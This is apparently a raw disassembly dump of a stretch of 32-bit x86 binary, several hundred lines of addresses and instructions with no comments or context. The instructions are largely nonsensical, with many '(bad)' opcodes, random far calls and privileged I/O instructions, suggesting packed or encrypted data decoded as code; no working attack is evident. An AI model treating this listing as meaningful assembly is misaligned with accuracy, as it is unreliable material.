  433598:	mov    ch,0x1f
  43359a:	push   edx
  43359b:	fcomp  QWORD PTR [esi]
  43359d:	loopne 0x4335a2
  43359f:	jl     0x433526
  4335a1:	mov    al,ds:0x265d0060
  4335a6:	add    DWORD PTR [ebp-0xd],esi
  4335a9:	add    BYTE PTR [si],dh
  4335ac:	sub    al,0x19
  4335ae:	add    ch,al
  4335b0:	or     cl,BYTE PTR es:[edi-0x6a26e9f0]
  4335b7:	cmc    
  4335b8:	(bad)  
  4335b9:	ds xchg ecx,eax
  4335bb:	and    DWORD PTR [esi-0x11],edx
  4335be:	sub    DWORD PTR [esi],0x8e7a5d10
  4335c4:	xor    DWORD PTR ss:[ebx+0x3ab5d242],ebp
  4335cb:	pusha  
  4335cc:	call   0xd0972399
  4335d1:	inc    ebx
  4335d2:	mov    al,0xa7
  4335d4:	pusha  
  4335d5:	aam    0xcf
  4335d7:	cmp    al,BYTE PTR [eax-0x5aca2ca5]
  4335dd:	pop    esi
  4335de:	sar    al,0xa
  4335e1:	jecxz  0x43357d
  4335e3:	sbb    eax,0x43a485aa
  4335e8:	or     cl,BYTE PTR [eax-0x2f6db956]
  4335ee:	dec    ebp
  4335ef:	pop    eax
  4335f0:	jle    0x4335a4
  4335f2:	pushf  
  4335f3:	iret   
  4335f4:	jbe    0x433637
  4335f6:	ins    DWORD PTR es:[edi],dx
  4335f7:	js     0x433619
  4335f9:	dec    esp
  4335fa:	adc    al,0x4b
  4335fc:	inc    esi
  4335fd:	xor    BYTE PTR [ebx-0x42],bh
  433600:	add    al,0xb7
  433602:	or     al,0xc5
  433604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433605:	mov    esi,0xbd04bc58
  43360a:	push   edx
  43360b:	xor    eax,0xada24548
  433610:	push   ebp
  433611:	sub    edx,DWORD PTR [edx+edx*1+0xe]
  433615:	loop   0x4335c1
  433617:	fcomp  QWORD PTR [esi+0x29]
  43361a:	inc    ebp
  43361b:	xor    BYTE PTR [eax+0x24615e6],0x0
  433622:	sbb    eax,0xa3a022c6
  433627:	pop    edx
  433628:	test   DWORD PTR [ebp+0x5c],edx
  43362b:	stos   DWORD PTR es:[edi],eax
  43362c:	push   edx
  43362d:	les    edx,FWORD PTR [edi]
  43362f:	lods   al,BYTE PTR ds:[esi]
  433630:	cmp    bl,al
  433632:	mov    ah,0x55
  433634:	sbb    BYTE PTR [eax],ch
  433636:	jbe    0x433642
  433638:	or     esi,DWORD PTR [edx+0x45af3374]
  43363e:	mov    esp,0xfad34c82
  433643:	push   ss
  433644:	mov    ss,WORD PTR [eax+0x517dad15]
  43364a:	jo     0x433603
  43364c:	xor    al,0xeb
  43364e:	push   edx
  43364f:	add    esi,edx
  433651:	neg    ch
  433653:	inc    esp
  433654:	push   ecx
  433655:	imul   ebp,DWORD PTR [edx-0x18],0xffffffe2
  433659:	xchg   edi,eax
  43365a:	mov    dh,0xcb
  43365c:	jmp    0x1660:0x2460519e
  433663:	jl     0x433671
  433665:	scas   al,BYTE PTR es:[edi]
  433666:	loopne 0x43367a
  433668:	inc    esp
  433669:	and    DWORD PTR [eax+0x66cbc078],0x2
  433670:	bound  ebp,QWORD PTR [ebx+0x660a1bba]
  433676:	push   esp
  433677:	jl     0x433623
  433679:	dec    eax
  43367a:	ds cwde 
  43367c:	retf   0xb89b
  43367f:	in     al,0x89
  433681:	inc    esi
  433682:	ret    
  433683:	push   0x7b982698
  433688:	or     cl,ah
  43368a:	xchg   ebp,eax
  43368b:	mov    esi,0xee7ef720
  433690:	test   eax,0x82e1a0b2
  433695:	inc    eax
  433696:	retf   
  433697:	and    bl,al
  433699:	into   
  43369a:	xor    ebp,DWORD PTR ds:0x6e05c1e1
  4336a0:	fidiv  DWORD PTR [edx]
  4336a2:	mov    ch,0xd0
  4336a4:	shl    BYTE PTR [eax+ebp*2+0x52],1
  4336a8:	jbe    0x433639
  4336aa:	in     al,dx
  4336ab:	pop    ebx
  4336ac:	cli    
  4336ad:	in     eax,dx
  4336ae:	retf   
  4336af:	ret    0x2
  4336b2:	int3   
  4336b3:	or     eax,0x4794fb3a
  4336b8:	mov    eax,ds:0x886d9aa0
  4336bd:	jecxz  0x4336fc
  4336bf:	sbb    al,0xa0
  4336c1:	jns    0x4336b9
  4336c3:	gs sbb al,0xd8
  4336c6:	pop    eax
  4336c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4336c8:	or     BYTE PTR ds:0xd405156c,bh
  4336ce:	mov    ah,0x41
  4336d0:	sbb    cl,BYTE PTR [eax]
  4336d2:	or     cl,BYTE PTR [eax+esi*2]
  4336d5:	sahf   
  4336d6:	add    cl,BYTE PTR [edx+0xc865d1e]
  4336dc:	stos   BYTE PTR es:[edi],al
  4336dd:	sub    eax,0x31faa7f7
  4336e2:	icebp  
  4336e3:	add    dl,dl
  4336e5:	adc    bl,BYTE PTR [edi-0x6]
  4336e8:	adc    DWORD PTR [ebx+0x5a],edx
  4336eb:	sub    al,0xd9
  4336ed:	and    ebp,edx
  4336ef:	mov    dl,0x7b
  4336f1:	mov    esi,0xed70211b
  4336f6:	test   DWORD PTR [ebp+0x63e06c41],esi
  4336fc:	jl     0x4336a8
  4336fe:	push   ebx
  4336ff:	adc    esi,edx
  433701:	(bad)  
  433702:	fimul  DWORD PTR [esi+0x3d120a47]
  433708:	ss iret 
  43370a:	(bad)  
  43370b:	xchg   BYTE PTR cs:[edx],dh
  43370e:	inc    ebx
  43370f:	(bad)  
  433710:	sub    dh,BYTE PTR ss:[edi]
  433713:	add    BYTE PTR [eax+0x17],dl
  433716:	fs popf 
  433718:	retf   0xf2a6
  43371b:	mov    ah,0xa8
  43371d:	mov    cl,0x80
  43371f:	lock cmp BYTE PTR [eax-0x2d],0xa0
  433724:	pop    edx
  433725:	stos   BYTE PTR es:[edi],al
  433726:	push   ecx
  433727:	push   ebp
  433728:	xor    edx,DWORD PTR [edx-0x5b5b21ab]
  43372e:	test   BYTE PTR [eax],cl
  433730:	inc    edi
  433731:	push   eax
  433732:	ror    ebp,0xda
  433735:	or     al,0xef
  433737:	pusha  
  433738:	jnp    0x4336dd
  43373a:	test   BYTE PTR ds:0xa0008002,bl
  433740:	lods   al,BYTE PTR ds:[esi]
  433741:	retf   0x1a67
  433744:	inc    ebp
  433745:	in     eax,dx
  433746:	push   edi
  433747:	push   eax
  433748:	rol    BYTE PTR [edx+0x10ea408c],1
  43374e:	cmc    
  43374f:	ret    0xf7c0
  433752:	lock call 0x3c2f:0x89093442
  43375a:	sahf   
  43375b:	enter  0x5a54,0x2
  43375f:	xor    DWORD PTR fs:[edx],esp
  433762:	or     ch,BYTE PTR [ecx]
  433764:	mov    edx,0xeb075
  433769:	ins    BYTE PTR es:[edi],dx
  43376a:	adc    BYTE PTR [eax-0x6fb7f250],bl
  433770:	xchg   esi,eax
  433771:	(bad)  
  433772:	push   esp
  433773:	add    eax,0x52c13bc
  433778:	mov    ds:0x93d01d86,al
  43377d:	inc    ebx
  43377e:	clc    
  43377f:	inc    edi
  433780:	sub    al,0x18
  433782:	jl     0x433787
  433784:	add    BYTE PTR [edi+0x1d],cl
  433787:	test   BYTE PTR ds:0xa29037ac,bl
  43378d:	jbe    0x4337a3
  43378f:	mov    ah,0x44
  433791:	cmp    dl,BYTE PTR ds:0x6a726f1e
  433797:	lods   eax,DWORD PTR ds:[esi]
  433798:	mov    es,WORD PTR [ecx+0x6d]
  43379b:	cmp    al,BYTE PTR [eax-0x78]
  43379e:	dec    esp
  43379f:	fucom  st(3)
  4337a1:	push   es
  4337a2:	stc    
  4337a3:	rol    BYTE PTR [eax-0x75afe498],0x4
  4337aa:	sbb    al,0x6d
  4337ac:	cmp    al,0xc2
  4337ae:	and    ebp,DWORD PTR [eax+0x379db4d5]
  4337b4:	ins    BYTE PTR es:[edi],dx
  4337b5:	ds out 0xd,al
  4337b8:	lods   eax,DWORD PTR ds:[esi]
  4337b9:	ror    edx,0x9f
  4337bc:	push   ss
  4337bd:	or     edx,DWORD PTR [edx-0x3cfaff96]
  4337c3:	sub    BYTE PTR [eax+0x53],ah
  4337c6:	push   ecx
  4337c7:	fidivr DWORD PTR [edx+eax*2-0x4a]
  4337cb:	push   eax
  4337cc:	pop    ebx
  4337cd:	repz jbe 0x4337ee
  4337d0:	rol    BYTE PTR [edx-0x10ff2e16],cl
  4337d6:	cs adc al,dh
  4337d9:	push   esp
  4337da:	inc    edx
  4337db:	and    DWORD PTR [ebp-0x5d7dd59d],esp
  4337e1:	das    
  4337e2:	inc    ebx
  4337e3:	or     eax,0x38e6c3ea
  4337e8:	jo     0x4337fe
  4337ea:	cmp    eax,0xe3aeb010
  4337ef:	xor    edx,DWORD PTR [eax-0x58]
  4337f2:	push   esp
  4337f3:	cmp    BYTE PTR [esi-0x2972c81f],dh
  4337f9:	jmp    0x433817
  4337fb:	jb     0x4337eb
  4337fd:	sub    dh,dl
  4337ff:	lock fidivr DWORD PTR [eax+0x69]
  433803:	pop    eax
  433804:	gs mov dh,0x7e
  433807:	pop    eax
  433808:	push   0xb7ec0a12
  43380d:	xchg   esp,eax
  43380e:	rcl    BYTE PTR [ebp-0x52be7518],1
  433814:	mov    ch,0xd6
  433816:	and    BYTE PTR [edx],ch
  433818:	es push ds
  43381a:	sub    BYTE PTR [esi],ah
  43381c:	out    dx,al
  43381d:	leave  
  43381e:	push   0x10
  433820:	sbb    al,0x5c
  433822:	dec    ebx
  433823:	stos   BYTE PTR es:[edi],al
  433824:	dec    eax
  433825:	push   ebp
  433826:	mov    ds:0x284444b9,al
  43382b:	adc    eax,0x960215ad
  433830:	(bad)  
  433831:	sar    BYTE PTR [edx+0x52],1
  433834:	retf   0xda4c
  433837:	les    eax,FWORD PTR [ecx]
  433839:	cli    
  43383a:	mov    ah,bh
  43383c:	(bad)  
  43383d:	sbb    DWORD PTR [edx+0x47aec030],ecx
  433843:	in     eax,dx
  433844:	jp     0x433823
  433846:	jno    0x433838
  433848:	fsub   DWORD PTR [edx+0x33]
  43384b:	push   es
  43384c:	shl    DWORD PTR [edi-0x6e77b880],1
  433852:	leave  
  433853:	ins    BYTE PTR es:[edi],dx
  433854:	fptan  
  433856:	push   edx
  433857:	inc    edi
  433858:	and    DWORD PTR [ebx+0x4c],0x38
  43385c:	jmp    0x5c14:0x2cfc7f8c
  433863:	or     bl,BYTE PTR [ebp+0x53907a40]
  433869:	int3   
  43386a:	cmp    BYTE PTR ds:0xb0445086,bh
  433870:	call   FWORD PTR [eax+edx*2-0x28]
  433874:	inc    ecx
  433875:	lds    ebp,FWORD PTR [edi-0x4f035d4]
  43387b:	add    ah,bl
  43387d:	call   0x4d5a:0x1009a29e
  433884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433885:	jmp    0x433873
  433887:	rcl    DWORD PTR [edx+eax*1-0x66],1
  43388b:	in     al,0xc4
  43388d:	ss es or ah,bh
  433891:	jbe    0x4338d0
  433893:	nop
  433894:	fdiv   st,st(0)
  433896:	adc    eax,DWORD PTR [edi-0x16019e66]
  43389c:	xor    al,0x2a
  43389e:	adc    DWORD PTR [edi+0x36],edx
  4338a1:	sub    bh,BYTE PTR [edx-0x5f47170a]
  4338a7:	pop    ebx
  4338a8:	and    al,0x84
  4338aa:	mov    ds:0x42d100e6,al
  4338af:	addr16 test al,0x10
  4338b2:	fld    TBYTE PTR [eax-0x170fd454]
  4338b8:	xor    ah,dl
  4338ba:	addr16 arpl bx,bp
  4338bd:	(bad)  
  4338be:	enter  0x5022,0x30
  4338c2:	jo     0x4338ff
  4338c4:	std    
  4338c5:	imul   esi,DWORD PTR [edx+ebx*1+0x47],0xaa9c6094
  4338cd:	cli    
  4338ce:	or     eax,DWORD PTR [ecx]
  4338d0:	scas   eax,DWORD PTR es:[edi]
  4338d1:	push   esi
  4338d2:	and    esp,esp
  4338d4:	test   BYTE PTR [ecx],ah
  4338d6:	int3   
  4338d7:	add    BYTE PTR [esp+edx*4],bh
  4338da:	push   es
  4338db:	push   eax
  4338dc:	in     eax,dx
  4338dd:	mov    esi,DWORD PTR [esi-0x43]
  4338e0:	sub    BYTE PTR [esi],cl
  4338e2:	push   0x412e0542
  4338e7:	test   BYTE PTR [ebx+eax*4+0x66a74366],bl
  4338ee:	bound  ecx,QWORD PTR [edx-0x6d0106cb]
  4338f4:	aam    0x6c
  4338f6:	loopne 0x4338a9
  4338f8:	mov    ebx,fs
  4338fa:	push   esi
  4338fb:	push   ss
  4338fc:	sub    al,0x85
  4338fe:	sub    BYTE PTR [edi-0x6b58458a],0xc0
  433905:	enter  0x8a5b,0x29
  433909:	cmp    al,0x5a
  43390b:	(bad)  [ebx+0x2a4c6c16]
  433911:	sbb    edi,DWORD PTR [eax-0x2e3271ce]
  433917:	jbe    0x4338fd
  433919:	mov    eax,0xc24661
  43391e:	les    ebx,FWORD PTR [ebx+ecx*4]
  433921:	fiadd  WORD PTR [edi-0x2a]
  433924:	(bad)  
  433925:	cld    
  433926:	rol    DWORD PTR [eax],1
  433928:	les    edx,FWORD PTR [eax]
  43392a:	add    BYTE PTR [ebp+ecx*1+0x30a8023a],dh
  433931:	sbb    DWORD PTR [esi],0x88155585
  433937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433938:	ss retf 
  43393a:	inc    esp
  43393b:	cmp    BYTE PTR [ebx-0x55f49eac],0x90
  433942:	push   ecx
  433943:	mul    BYTE PTR [eax-0x35]
  433946:	dec    esp
  433947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433948:	push   eax
  433949:	rol    esi,0x2a
  43394c:	adc    eax,0x24dc0a0
  433951:	test   al,0xa0
  433953:	mov    al,ds:0xc4002ce9
  433958:	fidivr DWORD PTR [edx+eax*4]
  43395b:	cld    
  43395c:	clc    
  43395d:	mov    dh,0xb4
  43395f:	inc    ecx
  433960:	mov    al,0x20
  433962:	sbb    DWORD PTR [eax+edi*2-0x2616cb38],ecx
  433969:	push   eax
  43396a:	stos   DWORD PTR es:[edi],eax
  43396b:	cmp    BYTE PTR [eax+eax*2+0x796acaee],dl
  433972:	mov    ds:0x1c8443a3,al
  433977:	in     al,0xcd
  433979:	push   esp
  43397a:	sub    BYTE PTR ds:0x8245f6d8,dh
  433980:	shl    edx,1
  433982:	jbe    0x43395e
  433984:	cmp    dh,BYTE PTR [eax+esi*2+0x1]
  433988:	(bad)  [ebx]
  43398a:	mov    ah,0xa
  43398c:	add    eax,0x2ef2048c
  433991:	leave  
  433992:	out    0xf4,eax
  433994:	nop
  433995:	(bad)  
  433996:	das    
  433997:	mov    ds,WORD PTR ds:0x7aed8620
  43399d:	mov    ecx,0xee32386d
  4339a2:	or     al,0x26
  4339a4:	outs   dx,DWORD PTR ds:[esi]
  4339a5:	cwde   
  4339a6:	adc    cl,bh
  4339a8:	add    BYTE PTR [ecx-0x2f],ch
  4339ab:	push   eax
  4339ac:	pusha  
  4339ad:	mov    esi,0xbe00c412
  4339b2:	jmp    DWORD PTR [edx+0x4103ecaf]
  4339b8:	pop    ss
  4339b9:	inc    edx
  4339ba:	pop    ebx
  4339bb:	or     al,BYTE PTR [edi]
  4339bd:	inc    edi
  4339be:	mov    esi,0xb0682cd9
  4339c3:	add    al,BYTE PTR [eax]
  4339c5:	add    al,ah
  4339c7:	mov    edx,0xb2aacabc
  4339cc:	add    ch,BYTE PTR [edx+ebx*1-0x12]
  4339d0:	sbb    al,0x9a
  4339d2:	sub    esp,DWORD PTR [esi+ebx*1-0x5e]
  4339d6:	pop    ss
  4339d7:	mov    ah,0xc1
  4339d9:	sub    al,0x1a
  4339db:	sti    
  4339dc:	or     DWORD PTR [ecx+eiz*4-0x5efdbd8],0x7dcdea01
  4339e7:	dec    dx
  4339e9:	xor    eax,0x1c64aa34
  4339ee:	and    al,0xfd
  4339f0:	push   esi
  4339f1:	dec    ebx
  4339f2:	xor    BYTE PTR [esi-0x74],0x4f
  4339f6:	(bad)  
  4339f7:	adc    BYTE PTR [edi+0x6a],bh
  4339fa:	ss jl  0x43399b
  4339fd:	mov    ah,0xc3
  4339ff:	or     dh,BYTE PTR [esi]
  433a01:	mov    ch,0x72
  433a03:	sbb    al,0xec
  433a05:	and    al,BYTE PTR [edx]
  433a07:	mov    al,0xe4
  433a09:	outs   dx,DWORD PTR ds:[esi]
  433a0a:	jo     0x433a11
  433a0c:	mov    ds:0x915aa9a0,eax
  433a11:	cli    
  433a12:	mov    edx,DWORD PTR [eax+0x15c16a1f]
  433a18:	aad    0x2c
  433a1a:	cmp    dl,BYTE PTR [eax-0x34]
  433a1d:	(bad)  
  433a1e:	fmul   st,st(1)
  433a20:	pop    eax
  433a21:	push   eax
  433a22:	jo     0x433a28
  433a24:	push   0x309518d6
  433a29:	inc    ebx
  433a2a:	jne    0x433a8d
  433a2c:	je     0x433a8a
  433a2e:	ret    
  433a2f:	loop   0x433aa3
  433a31:	xchg   esi,eax
  433a32:	cmp    eax,0xb8379ad8
  433a37:	pushf  
  433a38:	fisub  DWORD PTR [ecx+0x23a8001b]
  433a3e:	add    al,0xa1
  433a40:	cmp    BYTE PTR [eax],dl
  433a42:	add    ch,al
  433a44:	shr    BYTE PTR [esi+0xe9146e0],1
  433a4a:	test   eax,0xcc3db202
  433a4f:	out    dx,eax
  433a50:	mov    esp,0x598334cd
  433a55:	test   ah,dh
  433a57:	lods   al,BYTE PTR ds:[esi]
  433a58:	data16 or dh,BYTE PTR [edi-0x24]
  433a5c:	xchg   DWORD PTR [eax+ebx*8-0x62],esp
  433a60:	xor    DWORD PTR [esi],0x88c40e3a
  433a66:	pop    ss
  433a67:	pop    esp
  433a68:	mov    ds:0xf250d556,al
  433a6d:	cmp    DWORD PTR [eax],edi
  433a6f:	imul   ecx,DWORD PTR [esp+edx*8],0xe2c23ed0
  433a76:	add    al,al
  433a78:	sbb    BYTE PTR [esi+0x4229ab1e],0xbd
  433a7f:	add    BYTE PTR [eax+0x1e5a6cc3],ah
  433a85:	mov    dl,0x55
  433a87:	adc    BYTE PTR [edx+0x4fe802cd],dh
  433a8d:	jo     0x433aff
  433a8f:	mov    al,ds:0x78ad2026
  433a94:	xchg   edi,eax
  433a95:	dec    esp
  433a96:	adc    BYTE PTR ds:[eax+eax*1-0x3e197dbb],dh
  433a9e:	xor    dl,al
  433aa0:	jbe    0x433a85
  433aa2:	outs   dx,BYTE PTR ds:[esi]
  433aa3:	loop   0x433a8e
  433aa5:	mov    eax,ds:0x6324095e
  433aaa:	inc    ecx
  433aab:	mov    ebx,0xc8d0c6ae
  433ab0:	ins    BYTE PTR es:[edi],dx
  433ab1:	jno    0x433a64
  433ab3:	and    al,0x16
  433ab5:	mov    BYTE PTR [ecx+0x64],dh
  433ab8:	dec    esp
  433ab9:	add    al,0xd2
  433abb:	xor    ecx,ebp
  433abd:	xchg   BYTE PTR [ebp-0x56],bl
  433ac0:	dec    edi
  433ac1:	int3   
  433ac2:	inc    ebp
  433ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ac4:	dec    esi
  433ac5:	les    eax,FWORD PTR [esi+ecx*2+0x150926da]
  433acc:	or     eax,0xdb461c32
  433ad1:	je     0x433b28
  433ad3:	push   ebx
  433ad4:	mov    al,0x55
  433ad6:	test   BYTE PTR [edx+0x18],al
  433ad9:	and    bl,BYTE PTR [eax+0x78]
  433adc:	ins    DWORD PTR es:[edi],dx
  433add:	inc    ebp
  433ade:	stos   DWORD PTR es:[edi],eax
  433adf:	xor    ah,BYTE PTR [edx]
  433ae1:	adc    cl,BYTE PTR [edx-0x54]
  433ae4:	retf   
  433ae5:	xchg   esp,eax
  433ae6:	mov    BYTE PTR [bp+si+0x6b93],bl
  433aeb:	dec    ecx
  433aec:	or     edx,DWORD PTR [eax+esi*2]
  433aef:	ss repz jne 0x433b33
  433af3:	pop    es
  433af4:	or     DWORD PTR [esi-0x3e89f55a],0x12f47812
  433afe:	fimul  DWORD PTR [edx+0x52a6000e]
  433b04:	(bad)  
  433b05:	inc    ebp
  433b06:	hlt    
  433b07:	or     al,0xdb
  433b09:	mov    bl,0xa4
  433b0b:	(bad)  
  433b0d:	pop    ebx
  433b0e:	call   0xdd7d721
  433b13:	cld    
  433b14:	pop    edx
  433b15:	add    DWORD PTR [eax-0x6cd15f9a],esp
  433b1b:	cwde   
  433b1c:	dec    edx
  433b1d:	pop    esi
  433b1e:	dec    esp
  433b1f:	inc    ebp
  433b20:	rol    DWORD PTR [ecx+ecx*8-0x2a],0x30
  433b25:	ins    BYTE PTR es:[edi],dx
  433b26:	mov    esp,0x11ad0a4
  433b2b:	aam    0x2d
  433b2d:	fsub   DWORD PTR ds:0x4e3f5e85
  433b33:	sub    BYTE PTR [edx-0x486dd3a9],ah
  433b39:	es inc edx
  433b3b:	sub    esp,DWORD PTR [eax+ecx*4]
  433b3e:	cmp    eax,0x900f122
  433b43:	and    BYTE PTR [ebx-0x423fe278],0x5b
  433b4a:	ror    BYTE PTR [esp+0x1e],cl
  433b4e:	push   edx
  433b4f:	push   0x5e
  433b51:	mov    ch,0x36
  433b53:	or     al,0xd0
  433b55:	sbb    al,0x1f
  433b57:	or     al,0x7d
  433b59:	mov    es,si
  433b5c:	mov    al,ds:0xf4fc7612
  433b61:	sbb    edx,esp
  433b63:	(bad)  
  433b64:	(bad)  
  433b65:	loopne 0x433ae9
  433b67:	inc    esi
  433b68:	sub    esi,esi
  433b6a:	std    
  433b6b:	adc    eax,0xb07a9d04
  433b70:	dec    esi
  433b71:	mov    DWORD PTR [edx-0x2fa9ed71],esi
  433b77:	aad    0x2a
  433b79:	retf   0xf438
  433b7c:	jae    0x433b22
  433b7e:	and    DWORD PTR [edx-0x4f87dd9e],edi
  433b84:	push   ss
  433b85:	mov    ah,0x1d
  433b87:	mov    esi,0x81c76c24
  433b8c:	and    al,0x8e
  433b8e:	call   0x944e6ee7
  433b93:	or     bl,bl
  433b95:	xchg   esp,eax
  433b96:	mov    ebp,0x6826aea4
  433b9b:	xchg   edx,eax
  433b9c:	mov    bl,0x6
  433b9e:	retf   0x7ac8
  433ba1:	dec    ecx
  433ba2:	not    BYTE PTR [ebx+0x74bea146]
  433ba8:	in     al,dx
  433ba9:	cmp    bl,BYTE PTR [ecx]
  433bab:	mov    BYTE PTR [ecx],ch
  433bad:	jecxz  0x433b60
  433baf:	mov    al,ds:0x4c64046c
  433bb4:	ds dec eax
  433bb6:	fidiv  DWORD PTR [ecx+0x4]
  433bb9:	mov    eax,DWORD PTR [edx+0x37]
  433bbc:	jo     0x433be4
  433bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433bbf:	mov    WORD PTR [ecx+0x4c23e023],cs
  433bc5:	stc    
  433bc6:	jns    0x433bf0
  433bc8:	iret   
  433bc9:	loop   0x433bdc
  433bcb:	push   edx
  433bcc:	test   DWORD PTR [edx-0x1a],ecx
  433bcf:	fs pop ecx
  433bd1:	fwait
  433bd2:	pop    ebp
  433bd3:	add    eax,0xbaae0602
  433bd8:	or     BYTE PTR [esp+esi*2+0x163000e1],dl
  433bdf:	xor    eax,0x35585eb4
  433be4:	adc    al,0xce
  433be6:	bound  esi,QWORD PTR [edi-0x9]
  433be9:	test   eax,0x64d7b5a8
  433bee:	adc    BYTE PTR [edi+0x6a],al
  433bf1:	(bad)  
  433bf3:	fstp   st(2)
  433bf5:	sahf   
  433bf6:	xchg   esi,eax
  433bf7:	push   ss
  433bf8:	add    DWORD PTR [ebx],ecx
  433bfa:	(bad)  
  433bfb:	add    BYTE PTR [edi],0x1c
  433bfe:	add    ebp,DWORD PTR [edi]
  433c00:	sub    al,0x7d
  433c02:	repnz retf 
  433c04:	jns    0x433bf8
  433c06:	push   esp
  433c07:	data16 ss adc al,0x38
  433c0b:	push   ds
  433c0c:	(bad)  
  433c0d:	test   al,0x4f
  433c0f:	inc    edx
  433c10:	pop    edx
  433c11:	adc    al,0xe
  433c13:	ficom  WORD PTR [ebx+0x6a]
  433c16:	cmp    dl,BYTE PTR [esi-0x7d680530]
  433c1c:	xor    al,0xd6
  433c1e:	push   ebx
  433c1f:	call   0x4649:0x48aa6c17
  433c26:	ret    0x782a
  433c29:	push   0x0
  433c2b:	mov    ebx,0x68d533f9
  433c30:	pop    ds
  433c31:	and    al,0xbc
  433c33:	xchg   ecx,eax
  433c34:	jbe    0x433caf
  433c36:	ret    0x4199
  433c39:	add    eax,0x12140c3b
  433c3e:	pusha  
  433c3f:	inc    esi
  433c40:	or     al,0x37
  433c42:	xor    eax,0xb8478838
  433c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c48:	push   es
  433c49:	sub    al,0x28
  433c4b:	mov    ch,BYTE PTR [edx]
  433c4d:	or     dh,BYTE PTR [esi]
  433c4f:	fdiv   st(4),st
  433c51:	pop    edx
  433c52:	adc    cl,BYTE PTR ds:0x894a05ac
  433c58:	push   cs
  433c59:	adc    ecx,ebp
  433c5b:	mov    ah,BYTE PTR [esi]
  433c5d:	in     al,0x88
  433c5f:	lods   al,BYTE PTR ds:[esi]
  433c60:	inc    ebx
  433c61:	(bad)  
  433c62:	sub    esp,DWORD PTR [edx+0x6b]
  433c65:	mov    ds:0xbb5e2cc0,al
  433c6a:	cli    
  433c6b:	add    esp,DWORD PTR [eax]
  433c6d:	shl    ah,cl
  433c6f:	fwait
  433c70:	(bad)  
  433c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c72:	mov    ebx,0x52fd3db8
  433c77:	jne    0x433cb4
  433c79:	adc    eax,0x8a203813
  433c7e:	sbb    DWORD PTR [edx+0x71866bb0],0x7445f808
  433c88:	sub    eax,0x39a2a182
  433c8d:	ss sub ch,ch
  433c90:	arpl   WORD PTR [eax],ax
  433c92:	mov    dl,0x77
  433c94:	rcl    BYTE PTR [ebx],1
  433c96:	test   al,0x1
  433c98:	test   BYTE PTR [edx],al
  433c9a:	dec    esp
  433c9b:	ds push cs
  433c9d:	pop    esp
  433c9e:	pop    edx
  433c9f:	sbb    ebx,DWORD PTR [edx]
  433ca1:	push   0x1b
  433ca3:	mov    WORD PTR [ecx+0x2],ss
  433ca6:	mov    ah,0x2d
  433ca8:	sub    ch,BYTE PTR [ecx-0x2fa5fac7]
  433cae:	ror    DWORD PTR [eax+0xc],cl
  433cb1:	sti    
  433cb2:	and    al,0xb4
  433cb4:	add    DWORD PTR [ecx+edx*2],esi
  433cb7:	loopne 0x433d22
  433cb9:	or     edx,ecx
  433cbb:	inc    ebp
  433cbc:	xchg   BYTE PTR [edx-0x3128c0c3],ah
  433cc2:	sbb    dl,BYTE PTR [ecx-0x56d55b1a]
  433cc8:	mov    eax,DWORD PTR [edx+0x68aa0442]
  433cce:	pop    ecx
  433ccf:	inc    ebp
  433cd0:	sti    
  433cd1:	dec    esp
  433cd2:	jbe    0x433d41
  433cd4:	rsqrtps xmm5,XMMWORD PTR [esi-0x484d2fd8]
  433cdb:	push   ss
  433cdc:	adc    eax,0x124e5a54
  433ce1:	jae    0x433d0f
  433ce3:	loopne 0x433d0b
  433ce5:	xor    BYTE PTR [ecx],al
  433ce7:	punpckldq mm0,mm5
  433cea:	jl     0x433d5c
  433cec:	add    DWORD PTR [ecx],edi
  433cee:	in     al,0x1
  433cf0:	jge    0x433d12
  433cf2:	ss int3 
  433cf4:	(bad)  
  433cf5:	jl     0x433c7d
  433cf7:	ss dec ebx
  433cf9:	pop    ecx
  433cfa:	adc    eax,0x952ef68c
  433cff:	lods   al,BYTE PTR ds:[esi]
  433d00:	daa    
  433d01:	test   ah,bl
  433d03:	cli    
  433d04:	sbb    eax,DWORD PTR [edi-0x52c552ab]
  433d0a:	lods   al,BYTE PTR ds:[esi]
  433d0b:	adc    al,0x5a
  433d0d:	int    0xa5
  433d0f:	bnd jl 0x433cfd
  433d12:	mov    ch,0x5d
  433d14:	jb     0x433ca1
  433d16:	inc    esi
  433d17:	or     DWORD PTR [ecx-0x61],0xffffffbf
  433d1b:	loop   0x433cae
  433d1d:	push   ebp
  433d1e:	add    BYTE PTR [ebx-0x6a],ch
  433d21:	sub    ecx,DWORD PTR [eax-0x61]
  433d24:	and    eax,0x525aa9ae
  433d29:	push   ebx
  433d2a:	icebp  
  433d2b:	retf   
  433d2c:	shl    BYTE PTR [edx],1
  433d2e:	cmp    al,0x52
  433d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433d31:	sub    al,0x76
  433d33:	push   es
  433d34:	mov    bl,BYTE PTR [edx-0xd]
  433d37:	mov    al,es:0x9d00a661
  433d3d:	in     eax,dx
  433d3e:	adc    BYTE PTR [ebx-0x27f5169e],dh
  433d44:	cmp    bl,BYTE PTR [edx]
  433d46:	cwde   
  433d47:	repnz or al,0x4b
  433d4a:	and    BYTE PTR [ebx+0x34343612],0x1c
  433d51:	js     0x433d41
  433d53:	repnz mov al,ds:0x7cecfe44
  433d59:	sbb    DWORD PTR [ebp+0x51],edx
  433d5c:	push   edi
  433d5d:	test   dh,al
  433d5f:	and    bh,BYTE PTR [eax]
  433d61:	push   cs
  433d62:	loopne 0x433cf6
  433d64:	jo     0x433dae
  433d66:	push   esp
  433d67:	std    
  433d68:	rcl    BYTE PTR [edi],cl
  433d6a:	(bad)  
  433d6b:	out    0x92,al
  433d6d:	pushf  
  433d6e:	xchg   esp,eax
  433d6f:	inc    esp
  433d70:	fsubp  st(4),st
  433d72:	push   ss
  433d73:	lods   eax,DWORD PTR ds:[esi]
  433d74:	sub    dl,BYTE PTR [ecx]
  433d76:	dec    ebp
  433d77:	inc    eax
  433d78:	(bad)  
  433d7a:	jo     0x433d26
  433d7c:	push   edi
  433d7d:	fistp  DWORD PTR [esi]
  433d7f:	mov    esi,0x3d11684
  433d84:	call   0xc208:0x484ef3d1
